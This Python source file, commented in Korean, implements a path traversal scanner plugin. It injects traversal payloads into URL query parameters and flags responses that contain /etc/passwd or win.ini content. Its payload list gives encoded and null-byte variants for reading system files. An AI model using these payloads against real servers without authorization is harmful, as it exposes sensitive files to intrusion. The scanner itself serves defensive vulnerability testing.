"""
Path Traversal 스캔 로직

ATT&CK T1083 — File and Directory Discovery (Discovery)
대상 서버가 파일 경로 파라미터를 검증 없이 처리할 때
공격자가 웹 루트 밖의 민감한 파일을 읽을 수 있는 취약점을 탐지한다.
"""
from __future__ import annotations

import uuid
from typing import List, Optional
from urllib.parse import urlencode, urlparse, urlunparse, parse_qs

from s2n.s2nscanner.clients.http_client import HttpClient
from s2n.s2nscanner.interfaces import (
    Confidence,
    Finding,
    PluginContext,
    Severity,
)
from s2n.s2nscanner.logger import get_logger

logger = get_logger("plugins.path_traversal")

# ---------------------------------------------------------------------------
# 파일 경로 관련 파라미터명 — 이 이름을 가진 쿼리 파라미터를 우선 테스트한다.
# ---------------------------------------------------------------------------
PATH_PARAM_NAMES = {
    "file", "page", "path", "include", "doc", "document", "load",
    "read", "view", "template", "filename", "filepath", "dir",
    "folder", "resource", "source", "data", "content",
}

# ---------------------------------------------------------------------------
# Path Traversal 페이로드 목록
# ---------------------------------------------------------------------------
TRAVERSAL_PAYLOADS = [
    # Unix 기본
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    # 인코딩 우회
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    # 이중 인코딩
    "..%252F..%252F..%252Fetc%252Fpasswd",
    # Windows
    "..\\..\\..\\windows\\win.ini",
    "..%5C..%5C..%5Cwindows%5Cwin.ini",
    # Null byte (PHP 구형 환경)
    "../../../../etc/passwd%00",
    # Absolute path
    "/etc/passwd",
    "/etc/hosts",
]

# ---------------------------------------------------------------------------
# 성공 탐지 패턴 — 응답 본문에서 이 패턴이 있으면 취약점으로 판정한다.
# ---------------------------------------------------------------------------
UNIX_INDICATORS = [
    "root:x:0:0:",          # /etc/passwd 첫 항목
    "root:*:0:0:",          # BSD variant
    "/bin/bash",
    "/bin/sh",
    "nobody:x:",
    "/usr/sbin/nologin",
]
WINDOWS_INDICATORS = [
    "[fonts]",              # win.ini 고유 섹션
    "[extensions]",
    "[mci extensions]",
    "for 16-bit app support",
]
GENERIC_INDICATORS = UNIX_INDICATORS + WINDOWS_INDICATORS


def _inject_param(url: str, param: str, payload: str) -> str:
    """URL의 특정 파라미터 값을 payload로 교체한 새 URL을 반환한다."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _has_traversal_indicator(body: str) -> Optional[str]:
    """응답 본문에서 파일 내용 지시자를 찾아 반환한다. 없으면 None."""
    for indicator in GENERIC_INDICATORS:
        if indicator in body:
            return indicator
    return None


def scan_path_traversal(
    target_url: str,
    http_client: HttpClient,
    plugin_context: PluginContext,
    depth: int = 2,
) -> List[Finding]:
    """
    target_url 및 크롤된 URL에서 Path Traversal 취약점을 탐지한다.

    전략:
    1. 크롤러로 수집된 URL + target_url 에서 쿼리 파라미터를 추출한다.
    2. PATH_PARAM_NAMES에 해당하는 파라미터를 우선 테스트하고,
       나머지 파라미터도 순서대로 테스트한다.
    3. TRAVERSAL_PAYLOADS를 주입한 뒤 응답에서 GENERIC_INDICATORS를 확인한다.
    4. 첫 번째 확인된 취약점을 Finding으로 생성하고, 같은 URL+파라미터 조합은
       중복 생성하지 않는다.
    """
    findings: List[Finding] = []
    tested: set[tuple[str, str]] = set()  # (normalized_url, param)

    # 크롤된 URL 수집 (스캔 컨텍스트에서 가져오거나 target_url만 사용)
    # depth는 테스트할 최대 URL 수를 제한하는 데 사용한다 (depth * 10).
    max_urls = depth * 10
    scan_ctx = getattr(plugin_context, "scan_context", None)
    discovered: set[str] = getattr(scan_ctx, "discovered_urls", set())
    candidate_urls: list[str] = list(discovered)[:max_urls] if discovered else []
    if target_url not in candidate_urls:
        candidate_urls.insert(0, target_url)

    for url in candidate_urls:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue

        # 파일 경로 관련 파라미터를 앞에 배치하여 우선 테스트
        params = sorted(qs.keys(), key=lambda p: (p.lower() not in PATH_PARAM_NAMES))

        for param in params:
            key = (parsed.path, param)
            if key in tested:
                continue
            tested.add(key)

            for payload in TRAVERSAL_PAYLOADS:
                test_url = _inject_param(url, param, payload)
                try:
                    resp = http_client.get(test_url)
                    body = getattr(resp, "text", "") or ""
                    indicator = _has_traversal_indicator(body)
                    if indicator:
                        logger.warning(
                            "[path_traversal] FOUND at %s (param=%s, payload=%s)",
                            url, param, payload,
                        )
                        findings.append(
                            Finding(
                                id=str(uuid.uuid4()),
                                plugin="path_traversal",
                                severity=Severity.HIGH,
                                confidence=Confidence.FIRM,
                                title="ATT&CK T1083 — Path Traversal (File and Directory Discovery)",
                                description=(
                                    f"파라미터 '{param}'에 경로 순회 페이로드를 주입했을 때 "
                                    f"서버 시스템 파일 내용이 응답에 포함되었습니다. "
                                    f"공격자는 이를 통해 웹 루트 밖의 민감한 파일을 "
                                    f"읽을 수 있습니다."
                                ),
                                url=url,
                                parameter=param,
                                method="GET",
                                payload=payload,
                                evidence=indicator,
                                remediation=(
                                    "1. 파일 경로 파라미터를 whitelist 기반으로 검증하세요. "
                                    "2. realpath() / canonicalize_path()로 정규화 후 허용 디렉토리 내인지 확인하세요. "
                                    "3. 사용자 입력을 파일시스템 API에 직접 전달하지 마세요."
                                ),
                                references=[
                                    "https://attack.mitre.org/techniques/T1083/",
                                    "ATT&CK:T1083",
                                    "https://owasp.org/www-community/attacks/Path_Traversal",
                                    "https://cwe.mitre.org/data/definitions/22.html",
                                ],
                                cwe_id="CWE-22",
                            )
                        )
                        # 같은 URL+파라미터 조합에서 중복 Finding 방지
                        break

                except Exception as exc:
                    logger.debug(
                        "[path_traversal] request error (url=%s param=%s): %s",
                        test_url, param, exc,
                    )
                    continue

    return findings
